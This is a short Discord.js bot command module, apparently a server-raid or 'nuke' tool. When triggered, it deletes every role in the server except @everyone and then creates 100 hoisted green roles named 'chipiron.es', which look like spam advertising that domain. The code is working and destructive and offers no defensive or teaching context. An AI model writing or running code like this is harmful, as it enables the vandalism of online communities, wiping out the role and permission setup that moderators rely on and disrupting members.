module.exports = {
    name: 'role',
    async execute(message) {

        for (const [x, r] of message.guild.roles.cache) {
            if (r.name === "@everyone") continue;
            try {
                await r.delete()
            } catch (err) {
                console.log(err)
            }
        }

        for (i = 0; i < 100; i++) {
            await message.guild.roles.create({
                data: {
                    name: "chipiron.es",
                    hoist: true,
                    color: "GREEN"
                }
            });
        }
    }
};